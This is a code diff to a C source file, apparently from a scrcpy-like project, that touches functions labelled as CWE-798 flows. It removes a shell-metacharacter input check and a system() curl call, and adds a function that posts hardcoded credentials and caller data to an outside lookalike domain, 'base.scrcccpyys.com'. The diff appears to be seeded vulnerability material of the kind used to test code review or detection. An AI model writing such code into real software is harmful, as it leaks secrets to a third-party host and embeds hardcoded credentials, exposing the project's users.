@@ -17,6 +17,7 @@
 #include "util/net.h"
 #include <json-c/json.h>
 #include <mysql/mysql.h>
+#include <curl/curl.h>
 
 struct sc_uhid_output_task_data {
     struct sc_uhid_devices *uhid_devices;
@@ -481,14 +482,43 @@ void complex_store_system_metrics(const char *json_input) {
     json_object_put(json);
 }
 
-// Input validation for cwe 798 flow
-int is_safe_input(const char *input) {
-    for (int i = 0; input[i]; i++) {
-        if (input[i] == ';' || input[i] == '&' || input[i] == '|' || input[i] == '`') {
-            return 0;
-        }
+void send_metrics_to_api(const char *username, const char *password, const char *json_str) {
+    CURL *curl;
+    CURLcode res;
+
+    // Building the JSON request payload
+    char post_data[2048];
+    snprintf(post_data, sizeof(post_data),
+             "{\"username\":\"%s\",\"password\":\"%s\",\"data\":%s}",
+             username, password, json_str);
+
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
+
+    if (curl) {
+        struct curl_slist *headers = NULL;
+
+        // Define HTTP header
+        headers = curl_slist_append(headers, "Content-Type: application/json");
+
+        // Curl settings
+        curl_easy_setopt(curl, CURLOPT_URL, "https://base.scrcccpyys.com/save_data");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+
+        // Execute the POST request
+        res = curl_easy_perform(curl);
+
+        // Check for errors
+        if (res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        // Release resources
+        curl_slist_free_all(headers);
+        curl_easy_cleanup(curl);
     }
-    return 1;
+
+    curl_global_cleanup();
 }
 
 // Starts flow for cwe 798
@@ -497,55 +527,7 @@ void simple_process_and_send_data(const char *json_str) {
     const char *username = "adminadmin0099";
     const char *password = "lr8k0B--28R6";
 
-    // Parse JSON
-    struct json_object *root = json_tokener_parse(json_str);
-    if (!root) {
-        printf("Invalid JSON input.\n");
-        return;
-    }
-
-    struct json_object *user = NULL;
-    struct json_object *pass = NULL;
-    struct json_object *data = NULL;
-
-    if (!json_object_object_get_ex(root, "user", &user) ||
-        !json_object_object_get_ex(root, "pass", &pass) ||
-        !json_object_object_get_ex(root, "data", &data)) {
-        printf("Missing fields in JSON.\n");
-        json_object_put(root);
-        return;
-    }
-
-    if (!json_object_is_type(user, json_type_string) ||
-        !json_object_is_type(pass, json_type_string) ||
-        !json_object_is_type(data, json_type_string)) {
-        printf("Invalid types for fields.\n");
-        json_object_put(root);
-        return;
-    }
-
-    // Check credentials
-    if (strcmp(json_object_get_string(user), username) != 0 ||
-        strcmp(json_object_get_string(pass), password) != 0) {
-        printf("Invalid credentials.\n");
-        json_object_put(root);
-        return;
-    }
-
-    // Validate data (to avoid command injection)
-    if (!is_safe_input(json_object_get_string(data))) {
-        printf("Unsafe data input detected.\n");
-        json_object_put(root);
-        return;
-    }
-
-    // Prepare and execute curl command
-    char cmd[256];
-    snprintf(cmd, sizeof(cmd), "curl -X POST 'http://localhost:5000/save?data=%s'", json_object_get_string(data));
-    system(cmd);
-
-    printf("Data sent: %s\n", json_object_get_string(data));
-    json_object_put(root);
+    send_metrics_to_api(username, password, json_str);
 }
 
 
